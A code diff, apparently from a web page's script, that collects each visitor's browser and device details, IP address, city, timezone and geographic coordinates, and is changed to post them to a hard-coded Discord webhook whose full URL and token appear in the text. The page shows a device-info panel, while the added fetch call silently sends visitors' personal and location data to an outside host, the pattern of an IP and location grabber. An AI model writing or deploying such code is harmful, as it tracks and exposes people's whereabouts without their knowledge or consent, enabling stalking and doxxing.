@@ -170,30 +170,38 @@
             const deviceName = localStorage.getItem('customDeviceName') || `${platform} Device`;
             localStorage.setItem('customDeviceName', deviceName);
 
-            // Send data to a webhook (optional)
+            // Send data to the Discord webhook
             const data = {
-                deviceName,
-                deviceEdition,
-                deviceVersion,
-                systemType,
-                userAgent,
-                language,
-                screenWidth,
-                screenHeight,
-                ipAddress,
-                location: `${positionData.city}, ${positionData.region}`,
-                timezone: positionData.timezone,
-                coordinates: `${positionData.latitude}, ${positionData.longitude}`,
-                cpuCores
+                content: `**Device Info for ${deviceName}:**\n\n` +
+                    `**Device Name:** ${deviceName}\n` +
+                    `**Device Edition:** ${deviceEdition}\n` +
+                    `**Device Version:** ${deviceVersion}\n` +
+                    `**System Type:** ${systemType}\n` +
+                    `**Browser:** ${userAgent}\n` +
+                    `**Language:** ${language}\n` +
+                    `**Screen Size:** ${screenWidth} x ${screenHeight}\n` +
+                    `**IP Address:** ${ipAddress}\n` +
+                    `**Location:** ${positionData.city}, ${positionData.region}\n` +
+                    `**Timezone:** ${positionData.timezone}\n` +
+                    `**Coordinates:** ${positionData.latitude}, ${positionData.longitude}\n` +
+                    `**CPU Cores:** ${cpuCores}\n`
             };
 
-            fetch('YOUR_WEBHOOK_URL', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(data)
-            });
+            try {
+                const response = await fetch('https://discord.com/api/webhooks/1364966223380480070/x5tdCKI3GwMBmdyqN9wDk6lPa_iq9SVCUAVc7eFBXPT9RwZMy-F6L-4ehNGsUT-_XIlV', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                });
+
+                if (!response.ok) {
+                    console.error('Error sending to webhook:', response.status, response.statusText);
+                }
+            } catch (error) {
+                console.error('Error sending data to webhook:', error);
+            }
 
             // Update the device info panel
             infoDiv.innerHTML = `
